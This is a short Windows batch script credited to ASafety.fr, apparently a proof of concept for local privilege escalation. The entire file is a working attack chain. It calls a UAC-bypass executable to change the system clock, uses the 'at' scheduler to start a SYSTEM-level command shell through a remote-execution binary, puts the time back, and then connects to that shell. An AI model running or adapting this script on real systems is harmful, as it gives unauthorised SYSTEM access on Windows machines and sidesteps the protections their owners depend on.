:: Provided by ASafety.fr
@echo off
set BYPASSUACPATH=C:\Users\admin\Desktop\PoC\bypassuac.exe
set REMOTEPATH=C:\Users\admin\Desktop\PoC\remotex64.exe
set tmptime=%TIME%
%BYPASSUACPATH% /c time 13:37:57,44
%BYPASSUACPATH% /c at 13:38 %REMOTEPATH% /s cmd SYSCMD
ping 127.0.0.1 -n 3 > NUL
%BYPASSUACPATH% /c time %tmptime%
%REMOTEPATH% /c %COMPUTERNAME% SYSCMD